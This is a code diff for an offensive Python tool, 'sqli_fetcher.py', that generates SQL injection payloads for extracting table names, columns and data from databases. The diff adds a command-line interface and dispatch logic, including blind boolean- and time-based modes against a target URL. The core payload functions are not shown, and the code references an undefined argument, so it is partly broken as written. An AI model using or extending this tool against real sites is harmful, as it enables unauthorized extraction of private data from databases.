@@ -1,8 +1,7 @@
-import requests
-import sys
 import string
 import random
 import os
+import argparse
 
 def banner():
     text = '''
@@ -17,21 +16,7 @@ def banner():
     print(text)
     print("made by: DJumanto")
     print("We make your payload so you dont have to make one by yourself")
-
-# TODO: Make it interactive
-def menu():
-    print("\n\nUsage: python3 sqli_fetcher.py <your payload> <options>")
-    print("-m <method> : method to use")
-    print("Methods available: ")
-    print("\ttables")
-    print("\tcolumns")
-    print("\tdata")
-    print("-c <column count> : number of columns to return")
-    print("-t <table> : table to return")
-    print("-b <blind status> : blind mode (0 default for no, 1 for yes)")
-    print("-k <keystring> : keystring")
-    print("-s <substitution> : character substitution (comma separated)")
-    print("-d <dbcontext> : database context (default mysql)")
+    
 
 def generate_random_string():
     return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=10))
@@ -220,9 +205,55 @@ for j in range(i):
 print(data)
 """
 
+# TODO: Make it interactive [DONE]
+def menu():
+    parser = argparse.ArgumentParser(description="SQL Injection Fetcher")
+
+    parser.add_argument('payload', type=str, help="Your SQL injection payload")
+    parser.add_argument('-m', '--method', type=str, choices=['tables', 'columns', 'data'], help="Method to use")
+    parser.add_argument('-c', '--column_count', type=int, help="Number of columns to return")
+    parser.add_argument('-t', '--table', type=str, help="Table to return")
+    parser.add_argument('-b', '--blind', type=int, choices=[0, 1], default=0, help="Blind mode (0 for no, 1 for yes)")
+    parser.add_argument('-k', '--keystring', type=str, help="Keystring for the query")
+    parser.add_argument('-s', '--substitution', type=str, help="Character substitution (comma-separated) format: {old},{new},{old2},{new2},etc...")
+    parser.add_argument('-d', '--dbcontext', type=str, default='mysql', help="Database context (default mysql)")
+    parser.add_argument('-u', '--url', type=str, help="URL for blind mode")
+    parser.add_argument('-l', '--like', type=str, help="LIKE statement for blind mode")
+    parser.add_argument('-mo', '--mode', type=str, choices=['bool', 'time'], default='bool', help="Blind mode (bool or time)")
+
+    return parser.parse_args()
 
 if __name__ == '__main__':
     banner()
-    menu()
+    args = menu()
+    if args.blind == 0:
+        if args.method == 'tables':
+            print(return_tables(args.payload, args.column_count, args.keystring, args.substitution.split(',')))
+        elif args.method == 'columns':
+            print(return_columns(args.payload, args.table, args.column_count, args.keystring, args.substitution.split(',')))
+        elif args.method == 'data':
+            print(return_data(args.payload, args.table, args.column, args.column_count, args.keystring, args.substitution.split(',')))
+    else:
+        if(args.url == None):
+                print("Please provide a URL for column blind mode")
+                exit()
+        if args.method == 'tables':
+            if(args.like == None):
+                print("Please provide a LIKE statement for table blind mode")
+                exit()
+            if(args.mode == 'time'):
+                print(return_tables_blind(args.url, args.payload, args.like, args.mode))
+            else:
+                print(return_tables_blind(args.url, args.payload, args.like))
+        elif args.method == 'columns':
+            if(args.mode == 'time'):
+                print(return_columns_blind(args.url, args.payload, args.table, args.mode))
+            else:
+                print(return_columns_blind(args.url, args.payload, args.table))
+        elif args.method == 'data':
+            if(args.mode == 'time'):
+                print(return_data_blind(args.url, args.payload, args.table, args.column, args.mode))
+            else:
+                print(return_data_blind(args.url, args.payload, args.table, args.column))
 
 
